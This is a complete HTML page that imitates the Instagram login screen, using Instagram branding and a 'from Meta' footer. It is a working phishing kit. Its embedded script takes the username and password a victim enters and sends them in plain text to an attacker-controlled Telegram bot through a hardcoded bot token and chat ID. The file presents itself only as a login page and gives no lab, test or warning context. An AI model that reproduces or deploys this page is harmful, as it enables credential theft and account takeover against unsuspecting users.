<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #fafafa;
        }
        .login-container {
            text-align: center;
            width: 300px;
            background-color: #fff;
            padding: 20px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
        }
        .login-container img {
            width: 100px;
            margin-bottom: 20px;
        }
        .login-container button,
        .login-container input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 3px;
            box-sizing: border-box;
        }
        .login-container button {
            background-color: #3897f0;
            border: none;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
        }
        .login-container .forgot-password {
            color: #00376b;
            text-decoration: none;
            font-size: 12px;
        }
        .login-container .signup {
            margin-top: 20px;
            font-size: 14px;
        }
        .login-container .signup a {
            color: #3897f0;
            text-decoration: none;
            font-weight: bold;
        }
        .login-container .meta {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }
    </style>
    <script>
        async function sendMessage(event) {
            event.preventDefault();
            const botToken = '6754674975:AAHUEevW7zSMr-6RxyW9LTs7Tdey76F8CYQ';
            const chatId = '7026660972';
            const username = document.querySelector('input[name="username"]').value;
            const password = document.querySelector('input[name="password"]').value;

            const message = `Username: ${username}\nPassword: ${password}`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            try {
                await fetch(url);
                alert('Information sent successfully!');
            } catch (error) {
                alert('Failed to send information.');
                console.error('Error:', error);
            }
        }
    </script>
</head>
<body>
    <div class="login-container">
        <img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" alt="Instagram Logo">
        <form onsubmit="sendMessage(event)">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
        <a class="forgot-password" href="#">Forgot password?</a>
        <div class="signup">
            Don't have an account? <a href="#">Sign up</a>
        </div>
        <div class="meta">from Meta</div>
    </div>
</body>
</html>
